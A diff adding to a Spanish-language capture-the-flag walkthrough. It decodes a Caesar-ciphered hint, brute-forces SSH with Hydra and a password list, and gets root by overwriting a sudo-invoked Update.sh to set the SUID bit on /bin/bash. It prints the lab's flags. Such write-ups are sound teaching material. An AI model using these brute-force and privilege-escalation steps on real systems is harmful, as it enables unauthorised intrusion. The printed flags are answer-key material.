@@ -94,7 +94,7 @@ Utilizo el comando interno de smbclient para transferir el archivo a mi máquina
 ```ruby
 Bashsmb> get ilegal.txt
 ```
-2. Criptoanálisis:
+#  Criptoanálisis:
 Identificación del Cifrado César
 Al inspeccionar el contenido del archivo, observo un mensaje aparentemente aleatorio pero que mantiene la estructura sintáctica del lenguaje humano. Además, se incluye una nota crítica:` #NOTE:use 5, you understand me.Mensaje original:St qj htrufwyfx jxyf uflnsf f sfinj, xtqt vznjwt vzj qt ajfx yz, df vzj jxyt rj uzjij rjyjw jq uwtgqjrfx...`
 Deducción técnica:
@@ -105,4 +105,82 @@ Basándome en la frecuencia de caracteres y la estructura, determino que se trat
 5. Texto Cifrado:`St qj htrufwyfx...`
 6. Texto Descifrado: `No le compartas esta pagina a nadie, solo quiero que lo veas tu, ya que esto me puede meter el problemas: l2fhivsrcbyt2nu5rilmvmqmhpzhugai5szrmyrsyboykzvsokfd6did.onion4. `
 7. Identificación del Vector de Acceso `(Deep Web)`  resultado revela una URL con extensión .onion, lo que indica que el siguiente paso del vector de ataque se encuentra alojado en la red Tor `(The Onion Router)` .Para interactuar con este servicio y garantizar el anonimato y la accesibilidad al dominio, procedo con la instalación y configuración del Tor Browser en mi entorno de trabajo. Este hallazgo sugiere que el objetivo utiliza servicios ocultos para evadir la indexación de buscadores convencionales y ocultar infraestructura crítica.
-8. 
+
+
+# 3. Acceso mediante Red Tor y OSINT
+Para acceder al dominio .onion, despliego el navegador Tor de forma local:
+
+```Bash
+tar -xf tor-browser-linux-x86_64-14.0.3.tar.xz
+cd tor-browser/ && chmod +x start-tor-browser && ./start-tor-browser
+```
+Inteligencia en la Deep Web
+
+Navegando por el portal `Dark Forum`, accedo al chat de redroom 27 y obtengo el perfil del objetivo:
+
+Username: `dark` | IP: `192.168.1.105`
+
+En el apartado Hidden Marketplace, localizo una lista de contraseñas que almaceno en dic.txt:
+
+Contenido de dic.txt:
+```
+dark!6669, h@ck3r_p@ss, 1234deadbeef, q9jp3o8gxr#4, tr1cked43x!, a9x$e5f!th, sl@ve2the$y$tem, k!ll3rbl00d#10, f0rg3tt1ng#ev3r, @rchetype#22, enigm@t1c_4c1d, #chronic_6j23, W!nT3rR1d3r!, 5hadowhunter_99, t3mpor@l_hack!, blind_h@cker#17, C0mp1lex$24, f@1l1ngDarkn3ss, 4llC0ntr0lsf0rmed, deadc0d3!666, W1nt3rCh3ckmate_, xX_b@ckd00r_Xx, h@ck1ng_$p@wn, K0rruptedRoot!02, s1l3nce!000, ~n0_1ntrus1on~, d4rkw@ves_@_88, co_d3mned_h@ck, p!p3l0w1n$h@ck, 56r!m_revelation, DarkKnight99!____, oniondarkgood, Th3%_1nvis1bl3, ph0rce_breach!X9, pr0xys3v3r!x17, kn0ck3rd00r#!23, f3ars_th3_sh@d0w, 3vil_und3rworld!, 8n1ghtm@r3_p@ss, p@ssw0rddark!04, h@x0r_5kyline#44, @9gr34t_0verl0rd, subtr@ct0r_ninja, r!p_@_fakeb@by, cl@nd3st!n3_2_0, 777_n3ver_ch@ng3, b!llyh@cker2024, 4lph@_surviv0r, Blackout!eXodus22, 666root_!3, B@d#@ss__sh3l!11
+
+```
+$ 4. Intrusión Inicial (SSH Bruteforce)
+Utilizo Hydra para validar las credenciales contra el servicio SSH:
+
+```Bash
+hydra -l dark -P dic.txt ssh://<IP> -t 64
+```
+
+`Resultado: login:` dark password: oniondarkgood
+
+Accedo al sistema y recupero la flag de usuario:
+
+```Bash
+ssh dark@<IP>
+cat user.txt # Flag: 2eedcb4e067f16aa9c795fd05f3056bd
+```
+# 5. Escalada de Privilegios
+Tras analizar los privilegios del sistema con `sudo -l`, identifico un vector de ejecución:
+
+`Permiso:` (ALL : ALL) NOPASSWD: /home/dark/hidden.py
+
+`Análisis de Hijacking`
+El script de Python `hidden.py` ejecuta de forma interna un script de Bash:
+`script_path = '/usr/local/bin/Update.sh'`
+
+Al revisar los permisos de la carpeta `/usr/local/bin/`, detecto que mi usuario tiene permisos de escritura sobre el directorio `(drwxrwx--- 1 root dark)`.
+
+# Explotación del Vector SUID
+Procedo a eliminar el archivo original y suplantarlo con uno que asigne el bit SUID a /bin/bash:
+
+```Bash
+rm /usr/local/bin/Update.sh
+nano /usr/local/bin/Update.sh
+```
+# Contenido del nuevo Update.sh:
+```ruby
+#!/bin/bash
+chmod u+s /bin/bash
+```
+Ejecuto el script con privilegios de sudo para activar el cambio:
+
+```Bash
+sudo /home/dark/hidden.py
+```
+Compromiso Total (Root)
+Verifico la modificación de permisos en la bash y ejecuto la shell preservando privilegios:
+
+```Bash
+-rwsr-xr-x 1 root root ... /bin/bash
+bash -p
+# Whoami: root
+cat /root/root.txt # Flag: dee080ee744e9fb38952f236457f543b
+```
+
+
+
+
+
